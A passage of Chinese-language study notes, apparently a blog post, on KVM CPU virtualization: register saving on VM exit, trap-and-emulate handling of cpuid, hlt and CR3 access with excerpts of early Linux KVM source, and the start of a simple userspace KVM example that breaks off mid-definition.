&#125;<br><br><br></code></pre></td></tr></table></figure><ul><li>line 7 . KVM将宿主机的通用寄存器保存到栈中。当发生VM退出时，KVM从栈中将这些保存的宿主机的通用寄存器恢复到CPU的物理寄存器中。这里，宏R在64位下值为r，32位下为e。</li><li>rdx/edx寄存器是GCC保留的regparm特性，不能放在clobber list中，另外一个rbp/ebp寄存器也不生效，所以KVM手动保存了这两个寄存器</li><li>从Guest退出到Host时，CPU不会自动保存guest的通用寄存器等寄存器，KVM手动将其保存到了结构体vcpu_vmx中的子结构体中。因此，在Guest退出的那一刻，首先必须要获取结构体vcpu_vmx的实例，也就是第3行代码中的变量vmx，<strong>将CPU寄存器中的状态保存到这个vmx中</strong>，也就是说，在保存完Guest的状态后，才能进行其他操作，避免破坏Guest的状态。于是，每次从Host切入Guest前的最后一刻，KVM将vmx的地址压入栈顶，然后在Guest退出时从栈顶第一时间取出vmx。</li><li>如何将vmx压入栈顶呢？参见第47行代码，这里使用了GCC内联汇编的input约束，即在执行汇编代码前，告诉编译器将变量vmx加载到rcx/ecx寄存器，那么在执行第8行代码，即将rcx/ecx寄存器的内容压入栈时，实际上是将变量vmx压入栈顶了。</li><li>在Guest<strong>退出</strong>时，CPU会自动<strong>将VMCS中Host的rsp/esp寄存器恢复到物理CPU的rsp/esp寄存器中</strong>，所以此时可以<strong>访问VCPU线程在Host态下的栈</strong>。</li><li>在Guest退出后的第1行代码，即第36行代码，调用xchg指令将栈顶的值和序号%0指代的变量进行交换，根据第47行代码可见，%0指代变量vmx，对应的寄存器是rcx/ecx，也就是说，这行代码将切入Guest之前保存到栈顶的变量vmx的地址恢复到了rcx/ecx寄存器中，%0引用的也是这个地址，那么就可以使用%0引用这个地址保存Guest的寄存器了。</li></ul><p>这里上下文有点麻烦，详见书上吧</p><h2 id="1-3陷入和模拟"><a href="#1-3陷入和模拟" class="headerlink" title="1.3陷入和模拟"></a>1.3陷入和模拟</h2><ol><li>虚拟机并不会一直保持在Guest模式，而是需要在某些情况下切换到Host模式。在Host角度看，虚拟机就像是Host上的一个进程，与其他虚拟机一同共享系统资源。</li><li>虚拟机访问系统资源时，可能需要退出到Host模式，让VMM（虚拟机监控器）代为完成资源访问。例如，虚拟机进行I/O访问时，VMM会处理实际的文件读写或网络传输。类似地，访问设备I/O内存映射的地址空间可能会触发页面异常，需要KVM介入模拟设备处理。</li><li>虚拟机通常不会直接呈现Host的CPU信息，而是模拟特定的CPU型号。这意味着某些指令如cpuid在Guest模式下无法执行，需要KVM介入模拟这些指令。</li><li>陷入（或中断）可以是虚拟机主动触发的，比如虚拟机主动请求Host来完成某些任务，也可以是被动触发的，比如外部时钟中断或外设中断。被动触发的陷入通常是需要将CPU资源让给Host或进行特定处理的情况。</li></ol><h3 id="1-3-2-特殊指令"><a href="#1-3-2-特殊指令" class="headerlink" title="1.3.2 特殊指令"></a>1.3.2 特殊指令</h3><p>在虚拟化环境中，存在一些指令在机制上可以直接在虚拟机的Guest模式下本地运行，但是它们在<strong>虚拟化上下文中的语义与非虚拟化环境下</strong>完全不同。两个主要的例子是cpuid指令和hlt指令：</p><p><strong>cpuid</strong></p><p>在虚拟化环境中，对于cpuid指令的模拟是必要的，<strong>因为直接在Guest模式下运行该指令会导致获取的是宿主机物理CPU的各种特性</strong></p><p>为了保证虚拟机获得正确、一致的CPU特性信息，cpuid指令在虚拟化环境中需要被拦截并进行模拟，以确保虚拟机能够在各种环境下稳定运行，并且获得与实际情况相符的CPU特性信息。</p><ul><li>虚拟化监控器（VMM）需要在虚拟机执行cpuid指令时介入，模拟CPU的特性信息。由于VMM在虚拟化层面进行模拟，因此<strong>模拟的CPU可能支持更多的特性，与物理CPU不完全一致</strong>。VMM需要在执行cpuid指令时返回<strong>虚拟CPU的特性</strong>，以保证虚拟机获得正确的特性信息。</li><li><strong>虚拟机可能</strong>会在不同的宿主机之间<strong>迁移</strong>，为了<strong>确保虚拟机</strong>能够<strong>在不同环境下一致地运行</strong>，cpuid指令需要陷入VMM进行特殊处理。这意味着无论虚拟机在哪个物理主机上运行，<strong>其获取的CPU特性信息都应该保持一致</strong>，以避免应用程序因特性差异而受到影响。</li></ul><p>KVM的<strong>用户空间</strong>通过cpuid指令<strong>获取Host的CPU特征</strong>，加上用户空间的<strong>配置</strong>，定义好VCPU支持的CPU<strong>特性</strong>，<strong>传递给KVM内核模块</strong>。</p><p>KVM模块在内核中定义了接收来自用户空间定义的CPU特性的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">06465</span>c5a3aa9948a7b00af49cd22ed8f235cdb0f<br>KVM: Handle cpuid in the kernel instead of punting to<br>userspace<br>linux.git/include/linux/kvm.h<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry</span> &#123;</span><br>__u32 function;<br>__u32 eax;<br>__u32 ebx;<br>__u32 ecx;<br>__u32 edx;<br>__u32 padding;<br>&#125;;<br></code></pre></td></tr></table></figure><p>用户空间按照如下结构体kvm_cpuid的格式组织好CPU特性后，通过如下KVM模块提供的接口传递给KVM内核模块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">06465</span>c5a3aa9948a7b00af49cd22ed8f235cdb0f<br>KVM: Handle cpuid in the kernel instead of punting to userspace<br>linux.git/include/linux/kvm.h<br><br><span class="hljs-comment">/* 定义传递CPU特性的结构体 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid</span> &#123;</span><br>    __u32 nent; <span class="hljs-comment">/* 特性条目数量 */</span><br>    __u32 padding;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry</span> <span class="hljs-title">entries</span>[0];</span> <span class="hljs-comment">/* 特性条目数组 可变长度数组，存储实际的 CPU 特性信息*/</span><br>&#125;;<br><br>linux.git/drivers/kvm/kvm_main.<span class="hljs-function">c</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">kvm_vcpu_ioctl</span><span class="hljs-params">(struct file *filp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ioctl, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">case</span> KVM_SET_CPUID: &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid</span> __<span class="hljs-title">user</span> *<span class="hljs-title">cpuid_arg</span> =</span> argp;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid</span> <span class="hljs-title">cpuid</span>;</span><br><br>        <span class="hljs-comment">// 从用户空间复制传入的CPU特性结构体</span><br>        <span class="hljs-keyword">if</span> (copy_from_user(&amp;cpuid, cpuid_arg, <span class="hljs-keyword">sizeof</span>(cpuid)))<br>            <span class="hljs-keyword">goto</span> out;<br><br>        <span class="hljs-comment">// 调用函数设置VCPU的CPU特性</span><br>        r = kvm_vcpu_ioctl_set_cpuid(vcpu, &amp;cpuid, cpuid_arg-&gt;entries);<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kvm_vcpu_ioctl_set_cpuid</span><span class="hljs-params">(struct kvm_vcpu *vcpu, struct kvm_cpuid *cpuid,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   struct kvm_cpuid_entry __user *entries)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// 从用户空间复制特性条目数组到VCPU的特性条目数组</span><br>    <span class="hljs-keyword">if</span> (copy_from_user(&amp;vcpu-&gt;cpuid_entries, entries, cpuid-&gt;nent * <span class="hljs-keyword">sizeof</span>(struct kvm_cpuid_entry)))<br>        <span class="hljs-comment">// ...</span><br>    <span class="hljs-comment">// ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面这段代码用于在虚拟化环境中模拟处理虚拟机执行 <code>cpuid</code> 指令的情况。通过<strong>遍历</strong>虚拟机提供的 <code>cpuid_entries</code> 数组，KVM 在其中<strong>查找与当前功能号匹配</strong>的特性信息，将匹配的特性信息的字段值加载到虚拟 CPU 寄存器中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 代码片段用于模拟虚拟机执行 cpuid 指令的情况 */</span><br><br><span class="hljs-comment">/* KVM 模拟处理虚拟机中的 cpuid 指令 */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">kvm_emulate_cpuid</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    u32 function;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry</span> *<span class="hljs-title">e</span>, *<span class="hljs-title">best</span>;</span><br><br>    <span class="hljs-comment">/* 从虚拟 CPU 寄存器中获取 cpuid 指令的功能号 */</span><br>    function = vcpu-&gt;regs[VCPU_REGS_RAX];<br><br>    <span class="hljs-comment">/* 遍历 cpuid_entries 数组查找匹配的特性信息 */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; vcpu-&gt;cpuid_nent; ++i) &#123;<br>        e = &amp;vcpu-&gt;cpuid_entries[i];<br>        <span class="hljs-keyword">if</span> (e-&gt;function == function) &#123;<br>            best = e; <span class="hljs-comment">/* 找到与功能号匹配的特性信息 */</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">/* ... 其他特性信息的匹配判断 ... */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (best) &#123;<br>        <span class="hljs-comment">/* 将特性信息中的字段值复制到虚拟 CPU 寄存器 */</span><br>        vcpu-&gt;regs[VCPU_REGS_RAX] = best-&gt;eax;<br>        vcpu-&gt;regs[VCPU_REGS_RBX] = best-&gt;ebx;<br>        vcpu-&gt;regs[VCPU_REGS_RCX] = best-&gt;ecx;<br>        vcpu-&gt;regs[VCPU_REGS_RDX] = best-&gt;edx;<br>    &#125;<br><br>    <span class="hljs-comment">/* 跳过当前模拟的指令，继续执行下一条指令 */</span><br>    kvm_arch_ops-&gt;skip_emulated_instruction(vcpu);<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>当虚拟机执行<code>cpuid</code>指令并产生 VM exit 时，KVM会调用 <code>kvm_emulate_cpuid</code> 函数进行模拟。</li><li><code>vcpu-&gt;regs[VCPU_REGS_RAX]</code> 中存储了 <code>cpuid</code> 指令中的功能号，即 <code>eax</code> 寄存器的值。这个值用来确定要查询的 CPU 特性信息。</li><li>在 <code>vcpu-&gt;cpuid_entries</code> 数组中，存储了一系列的 CPU 特性信息，每个元素都是一个 <code>kvm_cpuid_entry</code> 实例，其中包含了不同功能号对应的特性信息。</li><li>通过遍历 <code>vcpu-&gt;cpuid_entries</code> 数组，KVM 在其中查找具有与当前功能号匹配的特性信息，即 <code>e-&gt;function == function</code>。</li><li>如果找到匹配的特性信息（<code>best</code> 非空），则将该特性信息中的 <code>eax</code>、<code>ebx</code>、<code>ecx</code>、<code>edx</code> 字段的值分别复制到虚拟 CPU 寄存器 <code>vcpu-&gt;regs</code> 的相应位置，以便在进入虚拟机后，虚拟 CPU 可以从这些寄存器读取 CPU 相关信息和特性。</li><li>最后，<code>skip_emulated_instruction</code> 函数用于通知 KVM 跳过当前模拟的指令，继续执行下一条指令。</li></ol><p>下面这段代码示例是在用户空间中处理虚拟机的 CPU 特性信息，以便在不同类型的宿主机之间迁移虚拟机。具体来说，它通过从 KVM 内核模块获取 CPU 特性信息，并清除不支持 AVX2 指令的特性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid2</span> *<span class="hljs-title">kvm_cpuid</span>;</span><br>kvm_cpuid = (struct kvm_cpuid2 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(*kvm_cpuid) + CPUID_ENTRIES * <span class="hljs-keyword">sizeof</span>(*kvm_cpuid-&gt;entries));<br>kvm_cpuid-&gt;nent = CPUID_ENTRIES;<br><br><span class="hljs-comment">// 获取支持的 CPU 特性信息</span><br>ioctl(vcpu_fd, KVM_GET_SUPPORTED_CPUID, kvm_cpuid);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; kvm_cpuid-&gt;nent; i++) &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry2</span> *<span class="hljs-title">entry</span> =</span> &amp;kvm_cpuid-&gt;entries[i];<br>    <br>    <span class="hljs-keyword">if</span> (entry-&gt;function == <span class="hljs-number">7</span>) &#123;<br>        <span class="hljs-comment">/* 清除 AVX2 指令支持 */</span><br>        entry-&gt;ebx &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 将修改后的 CPU 特性信息设置回虚拟机</span><br>ioctl(vcpu_fd, KVM_SET_CPUID2, kvm_cpuid);<br><br></code></pre></td></tr></table></figure><p><strong>hlt</strong></p><blockquote><p><code>hlt</code> 指令是一条汇编指令，用于让处理器进入空闲状态。它的作用是暂停当前处理器的执行，等待外部中断或其他事件的发生。当处理器执行到 <code>hlt</code> 指令时，它会停止执行指令，并将自己置于低功耗状态，直到有新的中断或事件触发处理器唤醒。</p></blockquote><p><code>hlt</code> 指令用于让处理器进入停机状态。在开启超线程的处理器中，<code>hlt</code> 指令会停止逻辑核的运行。对于虚拟化环境中的虚拟机，如果允许虚拟机的某个核本地执行 <code>hlt</code> 指令，将导致物理CPU停止运行，但实际上我们只需要停止用于模拟CPU的线程。因此，在虚拟化环境中，虚拟机执行 <code>hlt</code> 指令时需要陷入KVM，<strong>由KVM挂起对应的VCPU线程，而不是停止物理CPU的运行</strong>。下面代码片段展示了如何在KVM中处理虚拟机执行 <code>hlt</code> 指令，通过设置线程状态和调用内核调度函数，实现了在虚拟机中正确处理 <code>hlt</code> 指令的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 当处理器执行hlt指令后，将处于停机状态（Halt）。</span><br><span class="hljs-comment">// 对于开启了超线程的处理器，hlt指令是停止的逻辑核。</span><br><span class="hljs-comment">// 之后如果收到NMI、SMI中断，或者reset信号等，则恢复运行。</span><br><span class="hljs-comment">// 但是，对于虚拟机而言，如果任凭Guest的某个核本地执行hlt，</span><br><span class="hljs-comment">// 将导致物理CPU停止运行，然而我们需要停止的只是Host中用于模拟CPU的线程。</span><br><span class="hljs-comment">// 因此，Guest执行hlt指令时需要陷入KVM中，由KVM挂起VCPU对应的线程，而不是停止物理CPU。</span><br><br><span class="hljs-comment">// 文件：linux.git/drivers/kvm/vmx.c</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">handle_halt</span><span class="hljs-params">(struct kvm_vcpu *vcpu, ...)</span></span><br><span class="hljs-function"></span>&#123;<br>    skip_emulated_instruction(vcpu);<br>    <span class="hljs-keyword">return</span> kvm_emulate_halt(vcpu);<br>&#125;<br><br><span class="hljs-comment">// 文件：linux.git/drivers/kvm/kvm_main.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_emulate_halt</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>    kvm_vcpu_kernel_halt(vcpu);<br>    ...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">kvm_vcpu_kernel_halt</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>    <span class="hljs-keyword">while</span> (!(irqchip_in_kernel(vcpu-&gt;kvm) &amp;&amp; kvm_cpu_has_interrupt(vcpu))<br>            &amp;&amp; !vcpu-&gt;irq_summary &amp;&amp; !signal_pending(current)) &#123;<br>        set_current_state(TASK_INTERRUPTIBLE);<br>        ...<br>        schedule();<br>        ...<br>    &#125;<br>    ...<br>    set_current_state(TASK_RUNNING);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-3-3-访问具有副作用的寄存器"><a href="#1-3-3-访问具有副作用的寄存器" class="headerlink" title="1.3.3 访问具有副作用的寄存器"></a>1.3.3 访问具有副作用的寄存器</h3><p>在虚拟化环境中，Guest访问CPU的某些寄存器时，除了读写寄存器的内容外，还可能产生一些副作用。对于这些具有副作用的访问，CPU需要从Guest模式陷入VMM，由VMM进行模拟，以完成副作用操作。以下是一些典型示例：</p><ol><li><strong>核间中断（Inter-processor Interrupts）：</strong> 当Guest访问LAPIC的中断控制寄存器时，例如写入中断控制寄存器，可能<strong>触发LAPIC向其他处理器</strong>发送核间中断。这种操作的副作用需要由VMM模拟，从而保证在虚拟化环境中的正确处理。</li></ol><blockquote><p>LAPIC，全称为“Local Advanced Programmable Interrupt Controller”，是一种<strong>高级可编程中断控制器</strong>，常用于<strong>多处理器系统中的各个处理器核心之间进行中断的管理和协调</strong>。LAPIC负责处理本地（即同一物理处理器上的）中断，以及处理器之间的通信。</p></blockquote><p> 2.<strong>地址翻译和页表切换：</strong> 当Guest切换进程，其内核会设置CR3寄存器指向即将运行的进程的页表。在使用影子页表（Shadow Page Table）机制实现虚拟机地址（GVA）到宿主机物理地址（HPA）的映射时，<strong>虚拟机期望物理CPU的CR3寄存器指向KVM为Guest中即将投入运行的进程准备的影子页表。</strong> 因此，每当Guest切换进程时，CPU会陷入KVM，<strong>KVM将CR3寄存器设置为指向影子页表</strong>，以确保正确的地址映射。</p><p>在影子页表机制中，KVM需要对处理Guest对控制寄存器CR3的访问进行特殊处理，以便让KVM能够正确地进行虚拟地址到宿主机物理地址的转换。为了实现这个目标，KVM需要在<strong>VMCS</strong>（Virtual Machine Control Structure，虚拟机控制结构）中的Processor-Based VM-Execution Controls字段中设置特定的标志位，即第15位CR3-load exiting。<strong>这个标志位的设置会导致每当Guest访问物理CPU的CR3寄存器时，物理CPU会触发VM exit，即从Guest模式切换到Host模式，然后陷入KVM</strong>，由KVM负责处理这个VM exit。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 处理处理器控制寄存器（CR）的操作</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">handle_cr</span><span class="hljs-params">(struct kvm_vcpu *vcpu, …)</span></span><br><span class="hljs-function"></span>&#123;<br>    u64 exit_qualification; <span class="hljs-comment">// 退出限定信息</span><br>    <span class="hljs-keyword">int</span> cr; <span class="hljs-comment">// 控制寄存器编号</span><br>    <span class="hljs-keyword">int</span> reg; <span class="hljs-comment">// 目标寄存器编号</span><br>    <br>    <span class="hljs-comment">// 从VMCS中读取退出限定信息</span><br>    exit_qualification = vmcs_read64(EXIT_QUALIFICATION);<br>    <span class="hljs-comment">// 解析退出限定信息，提取控制寄存器编号和目标寄存器编号</span><br>    cr = exit_qualification &amp; <span class="hljs-number">15</span>;<br>    reg = (exit_qualification &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">15</span>;<br>    <br>    <span class="hljs-comment">// 根据退出限定信息的操作类型选择处理方式</span><br>    <span class="hljs-keyword">switch</span> ((exit_qualification &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">/* mov to cr */</span><br>            <span class="hljs-comment">// 根据不同的控制寄存器执行不同的操作</span><br>            <span class="hljs-keyword">switch</span> (cr) &#123;<br>                <span class="hljs-comment">// ...</span><br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-comment">// 控制寄存器CR3</span><br>                    <span class="hljs-comment">// 调用函数，加载目标寄存器的值到当前虚拟CPU的rsp和rip寄存器</span><br>                    vcpu_load_rsp_rip(vcpu);<br>                    <span class="hljs-comment">// 调用函数，设置当前虚拟CPU的CR3寄存器值为目标寄存器的值</span><br>                    set_cr3(vcpu, vcpu-&gt;regs[reg]);<br>                    <span class="hljs-comment">// 跳过已模拟的指令</span><br>                    skip_emulated_instruction(vcpu);<br>                    <span class="hljs-comment">// 返回处理结果</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>                <span class="hljs-comment">// ...</span><br>            &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="1-5-一个简单KVM用户空间实例"><a href="#1-5-一个简单KVM用户空间实例" class="headerlink" title="1.5  一个简单KVM用户空间实例"></a>1.5  一个简单KVM用户空间实例</h2><p>先做一下概念辨析：</p><ul><li><strong>创建虚拟机（Create VM）</strong>：这指的是在虚拟化平台（如 KVM、VMware、Hyper-V 等）中，建立一个<strong>虚拟机的实例</strong>。在这一步骤中，你<strong>为虚拟机分配资源，配置硬件特性，如内存、处理器等</strong>。创建虚拟机是虚拟化平台提供的功能，它是设置虚拟机的基本环境。</li><li><strong>创建 Guest</strong>：这指的是在<strong>虚拟机内部安装一个操作系统</strong>（Guest OS），使虚拟机能够在其内部运行一个独立的操作系统实例。这个操作系统可以是 Windows、Linux 或其他支持的操作系统。在创建 Guest 时，你需要安装操作系统的镜像文件，进行操作系统的配置和设置，就像在物理硬件上安装操作系统一样。</li></ul><p>通过一个<strong>具体的KVM用户空间的实例</strong>，我们可以总结CPU虚拟化的关键概念和步骤。在这个实例中，我们将代码放在一个名为kvm.c的文件中，主要涵盖以下几个要点：</p><ol><li><strong>虚拟机（VM）结构体</strong>（vm）：表示一台虚拟机，包含基本的计算机组件，如处理器和内存。每个<strong>虚拟机可以包含多个处理器，每个处理器有自己的状态（寄存器</strong>）。</li><li><strong>处理器（VCPU）结构体</strong>（vcpu）：表示一个虚拟的处理器。在这个实例中，我们<strong>只虚拟了一个vcpu。每个vcpu具有自己的寄存器状态</strong>，如通用寄存器和特殊寄存器。</li><li><strong>用户空间与内核通信</strong>：用户空间通过文件描述符/dev/kvm 与内核中的KVM模块进行通信。在实例中，我们<strong>使用全局变量g_dev_fd 来记录打开的/dev/kvm 文件描述符</strong>。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/kvm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">// 定义虚拟机结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> &#123;</span><br>    <span class="hljs-keyword">int</span> vm_fd;                           <span class="hljs-comment">// 虚拟机文件描述符，用于与内核通信</span><br>    __u64 ram_size;                      <span class="hljs-comment">// 虚拟机内存大小</span><br>    __u64 ram_start;                     <span class="hljs-comment">// 虚拟机内存起始地址</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_userspace_memory_region</span> <span class="hljs-title">mem</span>;</span> <span class="hljs-comment">// 虚拟机内存区域描述，用于告知内核虚拟机内存的位置和大小</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> *<span class="hljs-title">vcpu</span>[1];</span>                 <span class="hljs-comment">// 虚拟机处理器（VCPU）数组指针，这里只包含一个元素</span><br>&#125;;<br><br><span class="hljs-comment">// 定义虚拟处理器结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> &#123;</span><br>    <span class="hljs-keyword">int</span> id;                               <span class="hljs-comment">// 虚拟处理器的唯一标识符 </span><br>    <span class="hljs-keyword">int</span> fd;                               <span class="hljs-comment">// 虚拟处理器文件描述符，用于与内核通信</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_run</span> *<span class="hljs-title">run</span>;</span>                  <span class="hljs-comment">// 指向虚拟CPU运行状态的指针，用于在用户空间和内核空间传递状态信息</span><br>    <span class="hljs-class"><span 